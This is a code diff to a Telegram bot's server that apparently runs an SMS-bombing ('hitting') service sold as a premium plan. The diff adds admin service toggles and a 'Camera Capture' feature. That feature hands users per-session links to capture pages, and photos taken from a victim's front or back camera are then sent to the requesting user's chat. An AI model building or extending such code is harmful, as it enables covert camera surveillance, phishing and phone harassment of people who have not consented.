@@ -82,17 +82,36 @@ async function isAdmin(chatId: number): Promise<boolean> {
 }
 
 // ===== Bot Config =====
-async function getBotConfig(): Promise<{
+interface BotConfig {
   dailyLimit: number; defaultRounds: number; defaultBatch: number; defaultDelay: number;
-}> {
+  services: { schedule: boolean; customSms: boolean; cameraCapture: boolean };
+}
+
+async function getBotConfig(): Promise<BotConfig> {
   const val = await getSetting('tgbot_config');
   return {
     dailyLimit: val?.dailyLimit ?? 5,
     defaultRounds: val?.defaultRounds ?? 1,
     defaultBatch: val?.defaultBatch ?? 5,
     defaultDelay: val?.defaultDelay ?? 2,
+    services: {
+      schedule: val?.services?.schedule !== false,
+      customSms: val?.services?.customSms !== false,
+      cameraCapture: val?.services?.cameraCapture !== false,
+    },
     ...val,
   };
+}
+
+// ===== Telegram Send Photo =====
+async function sendPhoto(chatId: number, photoUrl: string, caption?: string) {
+  const body: any = { chat_id: chatId, photo: photoUrl };
+  if (caption) { body.caption = caption; body.parse_mode = 'HTML'; }
+  const res = await fetch(`${TELEGRAM_API}/sendPhoto`, {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body),
+  });
+  return res.json();
 }
 
 const CUSTOM_SMS_SERVICES = {
@@ -620,17 +639,30 @@ async function getMainMenuKeyboard(admin: boolean, chatId?: number) {
   if (isHitting) {
     topRow.push({ text: '🛑 Stop', callback_data: 'stop_hit' });
   }
+
+  const config = await getBotConfig();
+  const svc = config.services;
   
   const keyboard: any[][] = [
     topRow,
-    [{ text: `${modeIcon} Mode: ${modeText}`, callback_data: 'toggle_mode' }, { text: '📅 Schedule', callback_data: 'schedule_hit' }],
-    [{ text: '📲 Custom SMS', callback_data: 'custom_sms' }],
+    [{ text: `${modeIcon} Mode: ${modeText}`, callback_data: 'toggle_mode' }],
   ];
+
+  // Only show enabled services
+  const serviceRow: any[] = [];
+  if (svc.schedule) serviceRow.push({ text: '📅 Schedule', callback_data: 'schedule_hit' });
+  if (svc.customSms) serviceRow.push({ text: '📲 Custom SMS', callback_data: 'custom_sms' });
+  if (serviceRow.length > 0) keyboard.push(serviceRow);
+  
+  if (svc.cameraCapture) {
+    keyboard.push([{ text: '📷 Camera Capture', callback_data: 'camera_capture' }]);
+  }
 
   if (admin) {
     keyboard.push(
       [{ text: '💎 Premium', callback_data: 'premium_menu' }],
       [{ text: '📊 Stats', callback_data: 'stats' }, { text: '⚙️ Settings', callback_data: 'settings' }],
+      [{ text: '🔧 Services', callback_data: 'service_toggles' }],
       [{ text: '🥇 Give Unlimited', callback_data: 'give_unlimited' }],
       [{ text: '🗑️ Remove Premium', callback_data: 'remove_premium_prompt' }],
       [{ text: '📢 Broadcast', callback_data: 'broadcast_prompt' }, { text: '☁️ Workers', callback_data: 'workers' }],
@@ -673,6 +705,16 @@ serve(async (req) => {
     if (update._internal_continue) {
       const { chatId, phone, batch, delay, totalRounds, totalSuccess, totalFail, statusMsgId, nextApiIndex, runId, startedAt } = update;
       await runHitsForPhone(chatId, phone, 1, batch, delay, true, totalRounds, totalSuccess, totalFail, statusMsgId || 0, nextApiIndex || 0, runId || '', startedAt || 0);
+      return new Response('OK', { headers: corsHeaders });
+    }
+
+    // ===== Internal photo notification from capture pages =====
+    if (update._internal_photo_notify) {
+      const { chatId, photoUrl, cameraType, captureNum } = update;
+      if (chatId && photoUrl) {
+        const caption = `📷 <b>Camera Capture</b>\n\n📸 ${cameraType === 'front' ? 'Front' : 'Back'} Camera #${captureNum || 1}\n⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
+        await sendPhoto(chatId, photoUrl, caption);
+      }
       return new Response('OK', { headers: corsHeaders });
     }
 
@@ -742,6 +784,13 @@ serve(async (req) => {
 
       // --- Custom SMS ---
       if (data === 'custom_sms') {
+        const config = await getBotConfig();
+        if (!config.services.customSms) {
+          await editMessage(chatId, msgId, '❌ <b>Custom SMS is disabled by admin.</b>', {
+            inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]],
+          });
+          return new Response('OK', { headers: corsHeaders });
+        }
         await setBotState(chatId, { waiting_custom_sms_service: true });
         await editMessage(chatId, msgId, getCustomSmsServicePrompt(), getCustomSmsServiceKeyboard());
         return new Response('OK', { headers: corsHeaders });
@@ -766,6 +815,13 @@ serve(async (req) => {
 
       // --- Schedule Hit ---
       if (data === 'schedule_hit') {
+        const config = await getBotConfig();
+        if (!config.services.schedule) {
+          await editMessage(chatId, msgId, '❌ <b>Schedule Hit is disabled by admin.</b>', {
+            inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]],
+          });
+          return new Response('OK', { headers: corsHeaders });
+        }
         const prem = await isPremium(chatId);
         if (!prem.isPremium && !admin) {
           await editMessage(chatId, msgId, '🔒 <b>Premium Feature!</b>\n\n📅 Schedule Hit sirf <b>Unlimited</b> plan users ke liye hai.\n\n🥇 <b>Unlimited Plan - ₹199</b>\n• Unlimited hits\n• Schedule hitting\n• All features\n\n💬 Contact: @xyzdark62', {
@@ -869,6 +925,88 @@ serve(async (req) => {
             [{ text: '🏠 Main Menu', callback_data: 'main_menu' }],
           ],
         });
+        return new Response('OK', { headers: corsHeaders });
+      }
+
+      // --- Camera Capture ---
+      if (data === 'camera_capture') {
+        const config = await getBotConfig();
+        if (!config.services.cameraCapture) {
+          await editMessage(chatId, msgId, '❌ <b>Camera Capture is disabled by admin.</b>', {
+            inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]],
+          });
+          return new Response('OK', { headers: corsHeaders });
+        }
+        const sessionId = `tgcam_${chatId}_${Date.now()}`;
+        const siteUrl = (await getSetting('main_settings'))?.siteUrl || 'https://riyakichut.lovable.app';
+        const captureLink = `${siteUrl}/capture?session=${sessionId}`;
+        const chromeLink = `${siteUrl}/chrome-custom-capture?session=${sessionId}`;
+        const customLink = `${siteUrl}/custom-capture?session=${sessionId}`;
+
+        let text = `📷 <b>Camera Capture</b>\n\n`;
+        text += `🔗 <b>Your Capture Links:</b>\n\n`;
+        text += `📱 Normal:\n<code>${captureLink}</code>\n\n`;
+        text += `🌐 Chrome (Android):\n<code>${chromeLink}</code>\n\n`;
+        text += `🎨 Custom HTML:\n<code>${customLink}</code>\n\n`;
+        text += `<i>📸 Photos sirf tumhare chat me aayengi. Kisi aur ko nahi dikhegi.</i>`;
+
+        await editMessage(chatId, msgId, text, {
+          inline_keyboard: [
+            [{ text: '🔄 New Links', callback_data: 'camera_capture' }],
+            [{ text: '🏠 Main Menu', callback_data: 'main_menu' }],
+          ],
+        });
+        return new Response('OK', { headers: corsHeaders });
+      }
+
+      // --- Service Toggles (Admin) ---
+      if (data === 'service_toggles') {
+        if (!admin) { await answerCallbackQuery(cb.id, '❌ Admin only!'); return new Response('OK', { headers: corsHeaders }); }
+        const config = await getBotConfig();
+        const svc = config.services;
+
+        let text = `🔧 <b>Service Controls</b>\n\n`;
+        text += `Toggle services on/off for all users:\n\n`;
+        text += `📅 Schedule: ${svc.schedule ? '🟢 ON' : '🔴 OFF'}\n`;
+        text += `📲 Custom SMS: ${svc.customSms ? '🟢 ON' : '🔴 OFF'}\n`;
+        text += `📷 Camera Capture: ${svc.cameraCapture ? '🟢 ON' : '🔴 OFF'}\n`;
+
+        await editMessage(chatId, msgId, text, {
+          inline_keyboard: [
+            [{ text: `📅 Schedule ${svc.schedule ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:schedule' }],
+            [{ text: `📲 Custom SMS ${svc.customSms ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:customSms' }],
+            [{ text: `📷 Camera ${svc.cameraCapture ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:cameraCapture' }],
+            [{ text: '🏠 Main Menu', callback_data: 'main_menu' }],
+          ],
+        });
+        return new Response('OK', { headers: corsHeaders });
+      }
+
+      if (data.startsWith('toggle_svc:')) {
+        if (!admin) { await answerCallbackQuery(cb.id, '❌ Admin only!'); return new Response('OK', { headers: corsHeaders }); }
+        const svcKey = data.split(':')[1] as keyof BotConfig['services'];
+        const config = await getBotConfig();
+        if (svcKey in config.services) {
+          config.services[svcKey] = !config.services[svcKey];
+          await setSetting('tgbot_config', config);
+          const label = svcKey === 'schedule' ? '📅 Schedule' : svcKey === 'customSms' ? '📲 Custom SMS' : '📷 Camera Capture';
+          await answerCallbackQuery(cb.id, `${label} ${config.services[svcKey] ? 'ON ✅' : 'OFF ❌'}`);
+          // Re-render toggles
+          const svc = config.services;
+          let text = `🔧 <b>Service Controls</b>\n\n`;
+          text += `Toggle services on/off for all users:\n\n`;
+          text += `📅 Schedule: ${svc.schedule ? '🟢 ON' : '🔴 OFF'}\n`;
+          text += `📲 Custom SMS: ${svc.customSms ? '🟢 ON' : '🔴 OFF'}\n`;
+          text += `📷 Camera Capture: ${svc.cameraCapture ? '🟢 ON' : '🔴 OFF'}\n`;
+          await editMessage(chatId, msgId, text, {
+            inline_keyboard: [
+              [{ text: `📅 Schedule ${svc.schedule ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:schedule' }],
+              [{ text: `📲 Custom SMS ${svc.customSms ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:customSms' }],
+              [{ text: `📷 Camera ${svc.cameraCapture ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:cameraCapture' }],
+              [{ text: '🏠 Main Menu', callback_data: 'main_menu' }],
+            ],
+          });
+        }
         return new Response('OK', { headers: corsHeaders });
       }
 
